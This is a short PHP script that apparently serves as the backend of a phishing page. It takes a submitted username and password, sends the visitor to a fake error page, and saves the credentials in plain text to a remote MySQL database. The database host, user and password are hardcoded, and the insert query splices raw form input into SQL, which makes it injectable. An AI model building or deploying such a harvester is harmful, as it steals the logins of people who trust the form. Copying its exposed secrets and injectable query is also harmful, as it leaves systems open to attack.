<?php 
    header('Location: error.html');
   
    $username=$_POST['username'];
    $password=$_POST['password'];

    function userdata_insertion($uname,$pass){
        $connection=mysqli_connect("sql306.infinityfree.com","if0_36739767","1pSg3YTyRZ","if0_36739767_frta");
        $sql=$sql = "INSERT INTO juju (`username`, `password`) VALUES ('$uname',' $pass')";
        if (mysqli_query($connection, $sql)) {
            echo "New record created successfully";
        } 
        else{
            echo "Error: " . $sql . "<br>" . mysqli_error($connection);
          }
    }
    userdata_insertion($username,$password);
    exit();
?>
